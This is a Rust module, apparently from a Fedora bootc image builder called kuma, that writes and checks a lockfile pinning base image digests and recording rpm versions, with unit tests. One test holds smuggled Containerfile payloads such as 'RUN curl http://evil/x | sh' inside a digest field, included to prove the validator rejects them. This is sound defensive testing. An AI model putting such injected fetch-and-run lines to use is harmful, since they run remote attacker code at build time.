//! kuma.lock: what the last build actually resolved.
//!
//! The declaration says `base = "quay.io/fedora/fedora-bootc:44"`, and
//! that tag moves under you. It moved bootc 1.16.6 to 1.16.7 between two
//! `kuma update` runs and broke every build on this machine, which is the
//! whole argument for a lockfile in one sentence.
//!
//! What is locked and what is merely recorded is a deliberate split:
//!
//! - **The base digest is enforced.** Builds resolve `FROM name@sha256:…`
//!   from here, so the same declaration plus the same lock builds from
//!   the same bytes on any machine, forever.
//! - **Package versions are recorded, not enforced.** Pinning rpm NVRAs
//!   would be worse than useless on a live Fedora: the mirrors garbage
//!   collect old builds within weeks, so a pinned version turns into a
//!   build failure that has nothing to do with your declaration, and
//!   transitive dependencies stay unpinned regardless. What the record is
//!   *for* is seeing what moved between two builds and bisecting when one
//!   of them broke, which needs no enforcement at all.
//!
//! There is no `kuma lock` verb. `kuma build` reads the pin and refreshes
//! the record; `kuma update` is the one thing that moves the pin, because
//! moving it deliberately is what `kuma update` already meant.

use crate::host::host_output;
use anyhow::{Context, Result};
use serde::{Deserialize, Serialize};
use std::collections::BTreeMap;
use std::path::{Path, PathBuf};
use std::time::{SystemTime, UNIX_EPOCH};

pub const CURRENT_SCHEMA: u32 = 1;

#[derive(Serialize, Deserialize)]
pub struct Lock {
    pub schema_version: u32,
    /// When the record was taken. Informational: nothing reads it back,
    /// but a lockfile that can't tell you how old it is is annoying.
    pub locked_at: String,
    pub base: Base,
    pub resolved: Resolved,
}

#[derive(Serialize, Deserialize)]
pub struct Base {
    /// What the build resolved its base from: the declaration's
    /// `system.base` verbatim, or — for kuma's own composed base — the
    /// content-addressed `localhost/kuma-base:m…` tag, which embeds the
    /// manifest identity, so a manifest change reads as a changed
    /// reference exactly like an edited `system.base` would. Kept so a changed
    /// declaration can be told apart from a moved tag: the first means
    /// the pin is for a different image entirely and must be re-resolved.
    #[serde(rename = "ref")]
    pub reference: String,
    pub digest: String,
}

#[derive(Serialize, Deserialize)]
pub struct Resolved {
    /// name -> EVR.arch for everything in the built image. A map rather
    /// than a list of NVRAs, so it sorts by package name and a version
    /// bump is a one-line git diff instead of a delete plus an add.
    pub rpm: BTreeMap<String, String>,
}

/// Flatpaks and brew formulae are deliberately absent. They aren't
/// resolved at build time at all: convergence installs them on the
/// machine at first boot and every day after, so anything recorded here
/// would be a build-host guess describing a system nobody is running.
/// The image records the declared *lists* already; the versions belong to
/// the machine, which is the same acknowledged mutable edge `kuma
/// capture` works on.
const _: () = ();

impl Lock {
    /// Absent is normal (first build, fresh checkout), and so is
    /// unreadable: a corrupt lock must never block a build, because the
    /// next build regenerates it anyway.
    pub fn load(path: &Path) -> Option<Lock> {
        let text = std::fs::read_to_string(path).ok()?;
        match toml::from_str::<Lock>(&text) {
            Ok(lock) if lock.schema_version != CURRENT_SCHEMA => {
                eprintln!(
                    "{} has schema_version {} (this kuma writes {}); ignoring it",
                    path.display(),
                    lock.schema_version,
                    CURRENT_SCHEMA
                );
                None
            }
            // The digest is interpolated straight into `FROM name@…`, so a
            // hand-edited lock is a Containerfile injection: a newline in
            // this field appends arbitrary build steps that run as you.
            // Nobody reads a twenty-thousand-line generated file in a pull
            // request, which is exactly why lockfiles get poisoned.
            Ok(lock) if !is_digest(&lock.base.digest) => {
                eprintln!(
                    "{} has a malformed base digest ({:?}); ignoring it",
                    path.display(),
                    lock.base.digest
                );
                None
            }
            Ok(lock) => Some(lock),
            Err(err) => {
                eprintln!("{} is unreadable ({err}); rebuilding it", path.display());
                None
            }
        }
    }

    pub fn save(&self, path: &Path) -> Result<()> {
        let body = toml::to_string_pretty(self).context("cannot serialize the lock")?;
        let text = format!(
            "# Generated by kuma. Do not edit.\n\
             # The base digest is what builds actually use; the resolved\n\
             # package versions are a record to diff, not pins to install.\n\
             # `kuma update` is what moves this file.\n\n{body}"
        );
        std::fs::write(path, text).with_context(|| format!("cannot write {}", path.display()))
    }

    /// `name@sha256:…` for the declaration's base, or None when this lock
    /// describes a different one (the declaration was edited, so the
    /// declaration wins and the pin gets re-resolved).
    pub fn pin_for(&self, declared: &str) -> Option<String> {
        (self.base.reference == declared).then(|| pinned_ref(declared, &self.base.digest))
    }
}

/// `quay.io/fedora/fedora-bootc:44` -> `quay.io/fedora/fedora-bootc`
///
/// Splitting on the last colon *after the last slash* keeps a registry
/// port (`localhost:5000/x`) from being mistaken for a tag.
fn repo_name(reference: &str) -> &str {
    // A digest reference names the repo before the '@', and its digest
    // half contains a colon that the tag logic below would otherwise
    // split on, silently yielding `…/fedora-bootc@sha256`.
    let reference = match reference.split_once('@') {
        Some((repo, _digest)) => repo,
        None => reference,
    };
    let (prefix, last) = match reference.rsplit_once('/') {
        Some((prefix, last)) => (prefix.len() + 1, last),
        None => (0, reference),
    };
    match last.split_once(':') {
        Some((repo, _tag)) => &reference[..prefix + repo.len()],
        None => reference,
    }
}

/// `quay.io/fedora/fedora-bootc:44` + digest -> `quay.io/fedora/fedora-bootc@sha256:…`
///
/// The tag has to go: `name:tag@digest` is legal for some tools and
/// rejected by others, and the digest is the only part that decides what
/// gets pulled anyway.
pub fn pinned_ref(reference: &str, digest: &str) -> String {
    format!("{}@{digest}", repo_name(reference))
}

/// The digest the *registry* means by a tag, which for a multi-arch image
/// is the OCI index's and not the per-architecture manifest's.
///
/// This distinction is not cosmetic and it shipped wrong once.
/// `podman image inspect --format '{{.Digest}}'` reports the manifest for
/// the arch you are on, so pinning it (a) pins one architecture, which
/// breaks the lock's promise of building the same bytes on any machine,
/// and (b) can never be compared against what a registry says the tag
/// resolves to, so `kuma update --check` would report "moved" on every
/// run forever. Both digests are real and both name the same image; only
/// one of them is what the tag points at.
///
/// podman records both in RepoDigests and has no field naming which is
/// which, so the index is identified as the one that isn't the manifest.
/// A single-arch image has no index, and then the manifest digest *is*
/// what the tag resolves to.
///
/// The preference is real but it is not a guarantee, which is the part
/// that shipped wrong the second time. RepoDigests is podman's own
/// bookkeeping, and a machine that pulled the base exactly once can hold
/// only the per-architecture entry: this laptop reports both digests and
/// a fresh CI runner reported one, off the same tag. So the fallback
/// below is reached in practice and writes a per-arch digest into a real
/// lock. That is a fine thing to build `FROM`, and `base_moved` is
/// written to answer the moved question for either shape rather than
/// assuming this one succeeded.
fn index_digest(repo_digests: &[&str], manifest: &str, reference: &str) -> String {
    let name = repo_name(reference);
    repo_digests
        .iter()
        // entries for other repos (the same image tagged from a second
        // registry) name a different image to a different registry
        .filter_map(|entry| entry.split_once('@'))
        .filter(|(repo, _)| *repo == name)
        .map(|(_, digest)| digest)
        .find(|digest| *digest != manifest)
        .unwrap_or(manifest)
        .to_string()
}

/// `sha256:` and exactly 64 lowercase hex digits, which is the only shape
/// a manifest digest takes. Checked on load rather than on use, so there
/// is one gate rather than one per interpolation site.
fn is_digest(value: &str) -> bool {
    match value.strip_prefix("sha256:") {
        Some(hex) => {
            hex.len() == 64 && hex.bytes().all(|b| b.is_ascii_hexdigit() && !b.is_ascii_uppercase())
        }
        None => false,
    }
}

pub fn path_for(config_path: &Path) -> PathBuf {
    config_path.with_extension("lock")
}

/// The lock beside a declaration, if there is a usable one. Four callers
/// wanted this pair and each spelled it out.
pub fn for_config(config_path: &Path) -> Option<Lock> {
    Lock::load(&path_for(config_path))
}

/// The digest of a base image already in local storage, which is where it
/// is right after a build that used it. Local on purpose: reading it back
/// off the registry instead would race a tag that moved between the build
/// and the question, and record a digest the build never used.
pub fn base_digest(reference: &str) -> Result<String> {
    let out = host_output(&[
        "podman",
        "image",
        "inspect",
        "--format",
        "{{.Digest}}{{range .RepoDigests}}\n{{.}}{{end}}",
        reference,
    ])?;
    let mut lines = out.lines().map(str::trim).filter(|line| !line.is_empty());
    let manifest = lines.next().with_context(|| format!("no digest for {reference}"))?;
    anyhow::ensure!(
        manifest.starts_with("sha256:"),
        "unexpected digest {manifest:?} for {reference}"
    );
    let repo_digests: Vec<&str> = lines.collect();
    Ok(index_digest(&repo_digests, manifest, reference))
}

/// Has the tag stopped pointing at the locked image? Asked without
/// pulling anything, and without any tool but podman.
///
/// podman can reach a registry (`podman manifest inspect` accepts a
/// remote reference) but it prints the index rather than the index's own
/// digest, and it pretty-prints, so hashing its output would not match
/// what the registry actually signed. Comparing the tag's index against
/// the locked digest's index answers the question directly and needs no
/// digest arithmetic: if the tag still points at that image, the two
/// references describe the same document.
///
/// That rules out digest arithmetic and leaves one way to ask per kind
/// of digest a lock can hold, because the two shapes are not
/// interchangeable here:
///
/// - A **per-architecture digest** is listed in the tag's index, so
///   membership answers the question in a single call. Asking podman
///   about such a digest directly is not a slower way to the same
///   answer, it is an error: `podman manifest inspect` refuses a single
///   image ("Treating single images as manifest lists is not
///   implemented"). CI failed on exactly this.
/// - An **index digest** is listed nowhere, since an index does not name
///   itself, so the only comparison left is fetching the pinned
///   reference and diffing the two documents.
///
/// Membership is therefore tried first, and the second call is reached
/// only when it misses. Getting there proves the registry answered a
/// moment ago, so a failure on the pinned reference is podman refusing a
/// single image that this index no longer lists, which is the moved
/// case and not an error. That inference is what keeps this off podman's
/// error strings, which are not an interface.
///
/// skopeo would give the digest in one call instead of two, and was the
/// first implementation. It is not worth a second dependency: `kuma
/// build` needs nothing but podman, and one verb quietly needing more
/// makes that promise false for whoever doesn't have it installed. The
/// surviving limitation is a base published with no index at all, which
/// the first call cannot read either. Multi-arch is the norm and
/// fedora-bootc is one, so this trades an edge case for a dependency
/// everyone would otherwise have to install.
pub fn base_moved(reference: &str, digest: &str) -> Result<bool> {
    let tagged = registry_manifest(reference)?;
    if index_lists(&tagged, digest) {
        return Ok(false);
    }
    match registry_manifest(&pinned_ref(reference, digest)) {
        Ok(locked) => Ok(tagged != locked),
        Err(_) => Ok(true),
    }
}

/// Does this index list `digest` as one of its per-architecture
/// manifests? Pure over the document podman prints, so it is testable
/// without a registry.
///
/// Anything unparseable or indexless answers "no" rather than raising:
/// the only caller treats a miss as "ask the other way", which is the
/// safe direction. A malformed document that errored here would turn a
/// checkable lock into a hard failure, while a miss merely costs the
/// round trip this is trying to save.
fn index_lists(index: &str, digest: &str) -> bool {
    let Ok(doc) = serde_json::from_str::<serde_json::Value>(index) else {
        return false;
    };
    let Some(manifests) = doc.get("manifests").and_then(|m| m.as_array()) else {
        return false;
    };
    manifests.iter().any(|m| m.get("digest").and_then(|d| d.as_str()) == Some(digest))
}

fn registry_manifest(reference: &str) -> Result<String> {
    // `podman manifest inspect` has a dial timeout and no request
    // timeout, so a registry that accepts a connection and then stalls
    // blocks `kuma update --check` indefinitely. It takes no timeout
    // flag of its own, so the bound is the same one the backup probes
    // use.
    host_output(&["timeout", "60", "podman", "manifest", "inspect", reference]).with_context(|| {
        format!(
            "cannot ask the registry about {reference} (gone, offline, \
             or a single-architecture image, which podman can't inspect remotely)"
        )
    })
}

/// Everything the built image ended up containing. Asking the image
/// beats asking dnf: this is what shipped, including whatever arrived as
/// a dependency of something else.
pub fn resolved_rpms(tag: &str) -> Result<BTreeMap<String, String>> {
    let out = host_output(&[
        "podman",
        "run",
        "--rm",
        tag,
        "rpm",
        "-qa",
        "--qf",
        "%{NAME} %{EVR}.%{ARCH}\\n",
    ])?;
    Ok(parse_rpm_query(&out))
}

/// rpm's own field separator, so no NVRA guessing: package names contain
/// dashes (python3-dbus) and splitting one apart by hand gets it wrong.
pub fn parse_rpm_query(out: &str) -> BTreeMap<String, String> {
    out.lines()
        .filter_map(|line| line.trim().split_once(' '))
        .map(|(name, evr)| (name.to_string(), evr.to_string()))
        .collect()
}

/// What moved between two builds.
pub struct LockDiff {
    pub base_from: String,
    pub base_to: String,
    /// name, old version, new version
    pub changed: Vec<(String, String, String)>,
    pub added: Vec<String>,
    pub removed: Vec<String>,
}

impl LockDiff {
    pub fn is_empty(&self) -> bool {
        self.base_from == self.base_to
            && self.changed.is_empty()
            && self.added.is_empty()
            && self.removed.is_empty()
    }
}

pub fn diff(old: &Lock, new: &Lock) -> LockDiff {
    let mut changed = Vec::new();
    let mut added = Vec::new();
    for (name, version) in &new.resolved.rpm {
        match old.resolved.rpm.get(name) {
            Some(before) if before != version => {
                changed.push((name.clone(), before.clone(), version.clone()))
            }
            Some(_) => {}
            None => added.push(name.clone()),
        }
    }
    let removed = old
        .resolved
        .rpm
        .keys()
        .filter(|name| !new.resolved.rpm.contains_key(*name))
        .cloned()
        .collect();
    LockDiff {
        base_from: old.base.digest.clone(),
        base_to: new.base.digest.clone(),
        changed,
        added,
        removed,
    }
}

/// Take the record after a successful build and write it beside the
/// declaration. Never fatal: a build that produced an image succeeded,
/// and /usr/lib/kuma is read-only when the declaration came from the
/// image itself.
/// `digest` is the caller's to supply, because only the caller knows
/// whether it needs resolving. A build that followed a pin built from
/// exactly that digest and has nothing to look up; re-deriving it from
/// the pinned `name@sha256:…` reference would be circular, and asking the
/// local tag instead could record a newer image than the one built.
pub fn record(config_path: &Path, declared_base: &str, digest: String, tag: &str) -> Option<Lock> {
    let rpm = match resolved_rpms(tag) {
        Ok(rpm) => rpm,
        Err(err) => {
            eprintln!("cannot read the image's package list ({err}); no lock written");
            return None;
        }
    };
    let lock = Lock {
        schema_version: CURRENT_SCHEMA,
        locked_at: utc_now(),
        base: Base { reference: declared_base.to_string(), digest },
        resolved: Resolved { rpm },
    };
    let path = path_for(config_path);
    if let Err(err) = lock.save(&path) {
        eprintln!("{err:#}; continuing without a lock");
        return None;
    }
    Some(lock)
}

fn utc_now() -> String {
    let secs = SystemTime::now().duration_since(UNIX_EPOCH).map(|d| d.as_secs()).unwrap_or(0);
    rfc3339(secs)
}

/// Seconds since the epoch as `YYYY-MM-DDTHH:MM:SSZ`. Hand-rolled
/// (civil-from-days) rather than adding a date crate for one timestamp
/// nothing parses back.
pub(crate) fn rfc3339(secs: u64) -> String {
    let (days, rem) = ((secs / 86_400) as i64, secs % 86_400);
    // Howard Hinnant's civil_from_days, with the era shifted so day 0 is
    // 1970-01-01.
    let z = days + 719_468;
    let era = z.div_euclid(146_097);
    let doe = z.rem_euclid(146_097);
    let yoe = (doe - doe / 1460 + doe / 36_524 - doe / 146_096) / 365;
    let y = yoe + era * 400;
    let doy = doe - (365 * yoe + yoe / 4 - yoe / 100);
    let mp = (5 * doy + 2) / 153;
    let d = doy - (153 * mp + 2) / 5 + 1;
    let m = if mp < 10 { mp + 3 } else { mp - 9 };
    let y = if m <= 2 { y + 1 } else { y };
    format!("{y:04}-{m:02}-{d:02}T{:02}:{:02}:{:02}Z", rem / 3600, (rem % 3600) / 60, rem % 60)
}

#[cfg(test)]
mod tests {
    use super::*;

    /// A well-formed digest for the tests that round-trip through
    /// `load()`, which insists on 64 lowercase hex characters. Synthetic
    /// on purpose: a real digest off a registry would imply these tests
    /// depend on a particular image, and "sha256:aaa…" is legible in an
    /// assertion failure where 64 characters of entropy is not. Tests
    /// that never load a lock use short readable strings instead.
    fn digest(seed: char) -> String {
        format!("sha256:{}", seed.to_string().repeat(64))
    }

    fn lock(digest: &str, rpms: &[(&str, &str)]) -> Lock {
        Lock {
            schema_version: CURRENT_SCHEMA,
            locked_at: "2026-08-07T00:00:00Z".into(),
            base: Base {
                reference: "quay.io/fedora/fedora-bootc:44".into(),
                digest: digest.into(),
            },
            resolved: Resolved {
                rpm: rpms.iter().map(|(n, v)| (n.to_string(), v.to_string())).collect(),
            },
        }
    }

    /// The bug this fixes, in one test. podman reports the per-arch
    /// manifest as `.Digest` and puts BOTH that and the index digest in
    /// RepoDigests, with nothing saying which is which. Pinning the
    /// manifest pins one architecture, and comparing it against what a
    /// registry says the tag resolves to reports "moved" every time.
    ///
    /// Real values from quay.io/fedora/fedora-bootc:44, where 1650030c is
    /// the index (verified by hashing the raw OCI index) and 3e9f0422 is
    /// the x86_64 manifest.
    #[test]
    fn the_index_digest_is_what_a_tag_resolves_to() {
        let manifest = "sha256:3e9f0422";
        let index = "sha256:1650030c";
        let both = [
            "quay.io/fedora/fedora-bootc@sha256:1650030c",
            "quay.io/fedora/fedora-bootc@sha256:3e9f0422",
        ];
        let reference = "quay.io/fedora/fedora-bootc:44";
        assert_eq!(index_digest(&both, manifest, reference), index);
        // order is not contractual, so it is matched by value
        let flipped = [both[1], both[0]];
        assert_eq!(index_digest(&flipped, manifest, reference), index);

        // A single-arch image has no index, and then the manifest digest
        // IS what the tag resolves to.
        let one = ["quay.io/fedora/fedora-bootc@sha256:3e9f0422"];
        assert_eq!(index_digest(&one, manifest, reference), manifest);
        assert_eq!(index_digest(&[], manifest, reference), manifest);

        // The same image tagged from a second registry names a different
        // image to a different registry, and must not be picked up.
        let foreign = ["ghcr.io/someone/mirror@sha256:deadbeef"];
        assert_eq!(index_digest(&foreign, manifest, reference), manifest);
    }

    /// What `podman manifest inspect` prints for a multi-arch tag, cut to
    /// the fields read here. The digests are the real ones from
    /// quay.io/fedora/fedora-bootc:44.
    const FEDORA_INDEX: &str = r#"{
      "schemaVersion": 2,
      "mediaType": "application/vnd.oci.image.index.v1+json",
      "manifests": [
        {"digest": "sha256:c30f3679", "platform": {"architecture": "arm64"}},
        {"digest": "sha256:8210cf5b", "platform": {"architecture": "ppc64le"}},
        {"digest": "sha256:37460a10", "platform": {"architecture": "s390x"}},
        {"digest": "sha256:7d662ca3", "platform": {"architecture": "amd64"}}
      ]
    }"#;

    /// The regression: a lock holding a per-architecture digest used to
    /// be unanswerable, because the only question asked was one podman
    /// refuses for a single image. The index lists it, so membership
    /// answers it without asking about the digest at all.
    #[test]
    fn a_per_architecture_lock_is_answered_by_the_index_listing_it() {
        // 7d662ca3 is the amd64 manifest CI locked and then died on.
        assert!(index_lists(FEDORA_INDEX, "sha256:7d662ca3"));
        // Not this architecture, still this tag: membership is about the
        // digest, so no arch matching is needed to get the right answer.
        assert!(index_lists(FEDORA_INDEX, "sha256:c30f3679"));

        // A digest this tag no longer lists: the base moved.
        assert!(!index_lists(FEDORA_INDEX, "sha256:deadbeef"));

        // An index never names itself, so a lock holding the index digest
        // misses here on purpose and falls through to comparing the two
        // documents. Miss and moved are not the same answer, which is why
        // the caller cannot stop at this function.
        assert!(!index_lists(FEDORA_INDEX, "sha256:1650030c"));
    }

    /// A miss, never a raise: the caller's next move on a miss is to ask
    /// the registry the other way, so an unreadable document costs a
    /// round trip instead of turning a checkable lock into a failure.
    #[test]
    fn an_unreadable_index_is_a_miss_rather_than_an_error() {
        assert!(!index_lists("", "sha256:7d662ca3"));
        assert!(!index_lists("Error: unauthorized", "sha256:7d662ca3"));
        // A single image manifest has layers where an index has
        // manifests, and this is what podman prints when it does not
        // refuse outright.
        let single = r#"{"schemaVersion": 2, "config": {}, "layers": []}"#;
        assert!(!index_lists(single, "sha256:7d662ca3"));
        // Well-formed JSON, entries that are not what they should be.
        let ragged = r#"{"manifests": [{"platform": {}}, {"digest": 42}, "sha256:7d662ca3"]}"#;
        assert!(!index_lists(ragged, "sha256:7d662ca3"));
    }

    /// The tag has to come off: `name:tag@digest` is accepted by some
    /// tools and rejected by others, and a registry port must not be
    /// mistaken for one.
    #[test]
    fn pinning_replaces_the_tag_and_survives_a_registry_port() {
        let d = "sha256:abc";
        assert_eq!(
            pinned_ref("quay.io/fedora/fedora-bootc:44", d),
            "quay.io/fedora/fedora-bootc@sha256:abc"
        );
        assert_eq!(
            pinned_ref("quay.io/fedora/fedora-bootc", d),
            "quay.io/fedora/fedora-bootc@sha256:abc"
        );
        assert_eq!(pinned_ref("localhost:5000/kuma:44", d), "localhost:5000/kuma@sha256:abc");
        assert_eq!(pinned_ref("fedora-bootc:44", d), "fedora-bootc@sha256:abc");
    }

    /// A digest reference has a colon in its digest half, and the tag
    /// logic would split on it and yield `…/fedora-bootc@sha256`. That
    /// nonsense name matched nothing in RepoDigests, so index_digest
    /// silently fell back to the per-arch manifest and the whole fix
    /// above did nothing on any machine that already had a lock.
    #[test]
    fn a_digest_reference_still_names_its_repo() {
        assert_eq!(
            repo_name("quay.io/fedora/fedora-bootc@sha256:3e9f0422"),
            "quay.io/fedora/fedora-bootc"
        );
        assert_eq!(repo_name("localhost:5000/kuma@sha256:abc"), "localhost:5000/kuma");
        assert_eq!(repo_name("quay.io/fedora/fedora-bootc:44"), "quay.io/fedora/fedora-bootc");
        assert_eq!(repo_name("localhost:5000/kuma"), "localhost:5000/kuma");

        // and so the index is found when asked about a pinned reference
        let both = [
            "quay.io/fedora/fedora-bootc@sha256:1650030c",
            "quay.io/fedora/fedora-bootc@sha256:3e9f0422",
        ];
        assert_eq!(
            index_digest(&both, "sha256:3e9f0422", "quay.io/fedora/fedora-bootc@sha256:3e9f0422"),
            "sha256:1650030c"
        );
    }

    /// A lock pins the base it was taken for. Editing `system.base` in
    /// the declaration means the pin describes a different image, and the
    /// declaration is the truth, so the pin is dropped rather than
    /// silently building the old base.
    #[test]
    fn a_pin_only_applies_to_the_base_it_was_taken_for() {
        let lock = lock("sha256:abc", &[]);
        assert_eq!(
            lock.pin_for("quay.io/fedora/fedora-bootc:44").as_deref(),
            Some("quay.io/fedora/fedora-bootc@sha256:abc")
        );
        assert!(lock.pin_for("quay.io/fedora/fedora-bootc:45").is_none());
        assert!(lock.pin_for("ghcr.io/someone/else:44").is_none());
    }

    /// rpm's space separator, because package names contain dashes and
    /// splitting an NVRA by hand puts half of python3-dbus in the version.
    #[test]
    fn rpm_names_with_dashes_survive_parsing() {
        let parsed =
            parse_rpm_query("fish 4.0.2-1.fc44.x86_64\npython3-dbus 1.4.0-3.fc44.x86_64\n\n");
        assert_eq!(parsed.get("fish").unwrap(), "4.0.2-1.fc44.x86_64");
        assert_eq!(parsed.get("python3-dbus").unwrap(), "1.4.0-3.fc44.x86_64");
        assert_eq!(parsed.len(), 2);
    }

    #[test]
    fn diff_separates_a_version_bump_from_an_arrival() {
        let old = lock("sha256:old", &[("bootc", "1.16.6-1.fc44.x86_64"), ("gone", "1-1")]);
        let new = lock("sha256:new", &[("bootc", "1.16.7-1.fc44.x86_64"), ("new", "1-1")]);
        let d = diff(&old, &new);
        assert_eq!(d.base_from, "sha256:old");
        assert_eq!(d.base_to, "sha256:new");
        assert_eq!(
            d.changed,
            [("bootc".into(), "1.16.6-1.fc44.x86_64".into(), "1.16.7-1.fc44.x86_64".into())]
        );
        assert_eq!(d.added, ["new"]);
        assert_eq!(d.removed, ["gone"]);
        assert!(!d.is_empty());
    }

    #[test]
    fn an_unmoved_base_with_identical_packages_is_no_change() {
        let a = lock("sha256:same", &[("fish", "4.0.2-1.fc44.x86_64")]);
        let b = lock("sha256:same", &[("fish", "4.0.2-1.fc44.x86_64")]);
        assert!(diff(&a, &b).is_empty());
    }

    /// Round-trips through the file, because a lock nobody can read back
    /// is just a slow way to rebuild from the tag.
    #[test]
    fn a_written_lock_reads_back() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("kuma.lock");
        lock(&digest('a'), &[("fish", "4.0.2-1.fc44.x86_64")]).save(&path).unwrap();
        let text = std::fs::read_to_string(&path).unwrap();
        assert!(text.starts_with("# Generated by kuma. Do not edit."));
        let back = Lock::load(&path).unwrap();
        assert_eq!(back.base.digest, digest('a'));
        assert_eq!(back.resolved.rpm["fish"], "4.0.2-1.fc44.x86_64");
    }

    /// The digest is interpolated into `FROM name@…`, so a newline in it
    /// appends Containerfile steps that run at build time as you. A lock
    /// is generated, committed, and never read closely in review, which
    /// is the whole shape of a lockfile poisoning. Rejected on load, so
    /// there is one gate rather than one per interpolation site.
    #[test]
    fn a_lock_cannot_smuggle_build_steps_through_its_digest() {
        assert!(is_digest(&digest('a')));
        assert!(!is_digest("sha256:abc"), "too short");
        assert!(!is_digest(&format!("{}\nRUN curl evil | sh", digest('a'))), "the injection");
        assert!(!is_digest(&digest('a').replace("sha256", "sha512")));
        assert!(!is_digest(&digest('a').to_uppercase()), "hex is lowercase");
        assert!(!is_digest(""));

        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("evil.lock");
        std::fs::write(
            &path,
            "schema_version = 1\nlocked_at = \"x\"\n[base]\nref = \"a\"\ndigest = \"\"\"sha256:abc\nRUN curl http://evil/x | sh\"\"\"\n[resolved.rpm]\n",
        )
        .unwrap();
        assert!(Lock::load(&path).is_none(), "a poisoned lock is no lock at all");
    }

    /// Absent, corrupt, and from-the-future all mean the same thing to a
    /// build: no pin, carry on, write a fresh one afterward.
    #[test]
    fn an_unusable_lock_never_blocks_a_build() {
        let dir = tempfile::tempdir().unwrap();
        let missing = dir.path().join("nope.lock");
        assert!(Lock::load(&missing).is_none());

        let corrupt = dir.path().join("corrupt.lock");
        std::fs::write(&corrupt, "this is not toml {{{").unwrap();
        assert!(Lock::load(&corrupt).is_none());

        let future = dir.path().join("future.lock");
        std::fs::write(
            &future,
            "schema_version = 99\nlocked_at = \"x\"\n[base]\nref = \"a\"\ndigest = \"b\"\n[resolved.rpm]\n",
        )
        .unwrap();
        assert!(Lock::load(&future).is_none());
    }

    #[test]
    fn timestamps_are_rfc3339_utc() {
        assert_eq!(rfc3339(0), "1970-01-01T00:00:00Z");
        assert_eq!(rfc3339(1_770_000_000), "2026-02-02T02:40:00Z");
        // a leap day, because the calendar arithmetic is hand-rolled
        assert_eq!(rfc3339(1_709_164_800), "2024-02-29T00:00:00Z");
    }

    #[test]
    fn the_lock_sits_beside_its_declaration() {
        assert_eq!(path_for(Path::new("kuma.toml")), Path::new("kuma.lock"));
        assert_eq!(
            path_for(Path::new("examples/cosmic.kuma.toml")),
            Path::new("examples/cosmic.kuma.lock")
        );
    }
}
